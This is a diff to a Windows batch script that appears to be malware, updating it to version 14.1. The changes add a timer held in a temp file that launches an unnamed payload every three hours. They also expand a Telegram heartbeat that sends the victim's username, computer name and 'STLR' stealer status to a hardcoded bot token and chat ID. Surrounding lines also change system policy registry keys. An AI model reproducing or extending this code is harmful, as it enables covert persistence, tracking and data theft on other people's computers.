@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=14.0"
+set "BATCHVERSION=14.1"
 
 
 
@@ -228,7 +228,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
-
+set "COMSTARTED=0"
 
 
 
@@ -1603,6 +1603,52 @@ echo.
 
 
 
+
+
+
+:: Define the file to track the last run time
+set "LASTRUNFILE=%TEMP%\lastrun.log"
+
+:: Check if the file exists
+if not exist "%LASTRUNFILE%" (
+    echo 1 > "%LASTRUNFILE%"
+) else (
+    for /f "delims=" %%A in ('type "%LASTRUNFILE%"') do set /a MINUTESS=%%A + 1
+    echo !MINUTESS! > "%LASTRUNFILE%"
+)
+
+:: Read the updated value
+set /p MINUTESS=<"%LASTRUNFILE%"
+echo Minutess=%MINUTESS%
+echo.
+echo.
+
+:: Check if 180 minutes have passed
+if %MINUTESS% GEQ 180 goto 3HOURDONE
+goto 3HOURSTILL
+
+:3HOURDONE
+start "" "%file1%"
+set "COMSTARTED=1"
+echo 0 > "%LASTRUNFILE%"
+goto NEXT4
+
+:3HOURSTILL
+echo.
+Minutes is still %MINUTESS%
+echo.
+
+
+
+
+
+
+
+
+:NEXT4
+
+
+
 :EVERYMINSEND
 echo :EVERYMINSEND
 echo.
@@ -1638,7 +1684,7 @@ echo CheckSend=%CheckSend%
 set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
 set "CHAT_ID_RUNNING=-1002163721260"
 set "TOPIC_ID_RUNNING=73779"
-set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%.....|%time%|(v%BATCHVERSION%)"
+set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|RUNNING%CheckSend%|STLR%MINUTESS%(%COMSTARTED%).....|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
 set "CAPTION_RUNNING=This is a document for RUNNING Topic"
 set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
